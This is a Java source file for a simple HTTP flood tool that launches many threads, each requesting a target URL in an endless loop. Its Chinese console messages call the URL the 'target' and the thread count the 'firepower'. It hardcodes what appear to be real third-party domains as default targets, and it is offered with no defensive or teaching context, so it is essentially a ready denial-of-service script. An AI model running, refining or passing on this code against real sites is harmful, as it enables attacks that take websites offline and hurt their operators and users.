import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;


public class Att {

	static int threads=100;
	static String urlstr="http://chuanliangwang.com";
	public static void main(String[] args) {
		if (args!=null) {
			if (args.length==2) {
				urlstr=args[0];
				try {
					threads=Integer.valueOf(args[1]);
					
				} catch (Exception e) {
					e.printStackTrace();
				}
				System.out.println("目标:"+urlstr+",火力:"+threads);
			}else{
				System.out.println("参数不正确，cdhongxing.com,1000个线程");
			}
		}else {
			System.out.println("默认参数，cdhongxing.com,1000个线程");
		}
		
		Thread[] xiancheng=new Thread[threads];
		
		Runnable runnable=new Runnable() {
			public void run() {
				
				while(true){
					try {
						
						URL url = new URL(urlstr);
						HttpURLConnection connection = (HttpURLConnection) url.openConnection();
						BufferedReader in = new BufferedReader(new InputStreamReader(url
								.openStream()));

						// 返回结果*
						String inputline = in.readLine();
						System.out.print(".");
						
						//jlabel.setText(count+"");
						//count++;
						
					} catch (Exception e) {
						e.printStackTrace();
					}
					
					
				}
				
			}
		} ;
		
		for (Thread thread : xiancheng) {
			thread=new Thread(runnable);
			thread.start();
		}
		
		
		
	}


	
	 public static String doPost(String data,String url) throws Exception {
		 
	
	        
	        URL localURL = new URL(url);
	        URLConnection connection = localURL.openConnection();
	        HttpURLConnection httpURLConnection = (HttpURLConnection)connection;
	        
	        httpURLConnection.setDoOutput(true);
	        httpURLConnection.setRequestMethod("POST");
	        httpURLConnection.setRequestProperty("Accept-Charset", "utf-8");
	        httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
	        httpURLConnection.setRequestProperty("Content-Length", String.valueOf(data.length()));
	        
	        OutputStream outputStream = null;
	        OutputStreamWriter outputStreamWriter = null;
	        InputStream inputStream = null;
	        InputStreamReader inputStreamReader = null;
	        BufferedReader reader = null;
	        StringBuffer resultBuffer = new StringBuffer();
	        String tempLine = null;
	        
	        try {
	            outputStream = httpURLConnection.getOutputStream();
	            outputStreamWriter = new OutputStreamWriter(outputStream);
	            
	            outputStreamWriter.write(data.toString());
	            outputStreamWriter.flush();
	            
	            if (httpURLConnection.getResponseCode() >= 300) {
	                throw new Exception("HTTP Request is not success, Response code is " + httpURLConnection.getResponseCode());
	            }
	            
	            inputStream = httpURLConnection.getInputStream();
	            inputStreamReader = new InputStreamReader(inputStream);
	            reader = new BufferedReader(inputStreamReader);
	            
	            while ((tempLine = reader.readLine()) != null) {
	                resultBuffer.append(tempLine);
	            }
	            
	        } finally {
	            
	            if (outputStreamWriter != null) {
	                outputStreamWriter.close();
	            }
	            
	            if (outputStream != null) {
	                outputStream.close();
	            }
	            
	            if (reader != null) {
	                reader.close();
	            }
	            
	            if (inputStreamReader != null) {
	                inputStreamReader.close();
	            }
	            
	            if (inputStream != null) {
	                inputStream.close();
	            }
	            
	        }

	        return resultBuffer.toString();
	    }
	
}
